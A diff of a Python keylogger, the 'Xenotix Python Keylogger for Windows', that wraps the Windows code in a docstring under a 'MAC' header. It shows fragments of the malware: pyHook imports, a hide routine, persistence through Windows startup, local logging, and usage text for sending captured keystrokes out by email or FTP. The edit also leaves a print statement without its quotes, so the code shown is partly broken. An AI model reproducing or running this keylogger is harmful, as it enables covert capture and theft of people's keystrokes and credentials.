@@ -1,3 +1,34 @@
+"""MAC"""
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+"""
+WINDOWS:
 try:
     import pythoncom, pyHook
 except:
@@ -31,7 +62,7 @@ def hide():
     return True
 
 def msg():
-    print """\n \nXenotix Python Keylogger for Windows
+    print \n \nXenotix Python Keylogger for Windows
 Coder: Ajin Abraham <ajin25@gmail.com>
 OPENSECURITY.IN
 usage:xenotix_python_logger.py mode [optional:startup]
@@ -43,7 +74,7 @@ mode:
      email: send the logs to an email. You must specify (SERVER,PORT,USERNAME,PASSWORD,TO).
 
      ftp: upload logs file to an FTP account. You must specify (SERVER,USERNAME,PASSWORD,SSL OPTION,OUTPUT DIRECTORY).
-[optional] startup: This will add the keylogger to windows startup.\n\n"""
+[optional] startup: This will add the keylogger to windows startup.\n\n
     return True
 
 # Add to startup
@@ -67,3 +98,4 @@ def local():
         fp.close()
         data=''
     return True
+"""
